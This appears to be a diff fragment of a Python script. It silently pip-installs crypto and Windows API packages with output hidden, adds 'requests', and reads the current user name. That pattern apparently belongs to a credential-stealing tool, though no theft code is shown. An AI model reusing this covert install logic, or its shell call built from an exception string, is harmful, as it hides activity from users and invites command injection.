@@ -7,7 +7,7 @@ except ImportError as e:
     except:
         subprocess.run(f"pip install {e}", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
     finally:
-       subprocess.run(f"pip install pycryptodome pypiwin32 pycryptodomex pywin32", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+       subprocess.run(f"pip install pycryptodome pypiwin32 pycryptodomex pywin32 requests", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
 
 time.sleep(2)
 user = os.getlogin()
